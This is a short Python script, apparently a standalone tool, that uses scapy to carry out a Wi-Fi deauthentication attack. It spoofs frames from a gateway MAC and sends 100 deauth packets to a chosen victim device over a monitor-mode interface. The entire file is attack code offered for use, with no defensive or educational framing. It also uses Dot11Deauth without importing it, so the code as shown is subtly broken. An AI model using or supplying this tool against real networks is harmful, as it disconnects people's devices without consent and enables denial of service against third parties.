from scapy.all import RadioTap, Dot11, sendp
import argparse

def send_deauth_packet(target_mac, gateway_mac, iface):
    # Create a deauthentication packet
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    # Send the deauth packet
    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
    print(f"Sent deauth packets to {target_mac} from {gateway_mac}")

def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Packet Injection Tool (Deauth Attack)")
    parser.add_argument("-t", "--target", type=str, help="Target MAC address (victim)", required=True)
    parser.add_argument("-g", "--gateway", type=str, help="Gateway MAC address (AP)", required=True)
    parser.add_argument("-i", "--interface", type=str, help="Monitor mode interface", required=True)

    args = parser.parse_args()

    # Perform packet injection (Deauth attack)
    send_deauth_packet(args.target, args.gateway, args.interface)

if __name__ == "__main__":
    main()
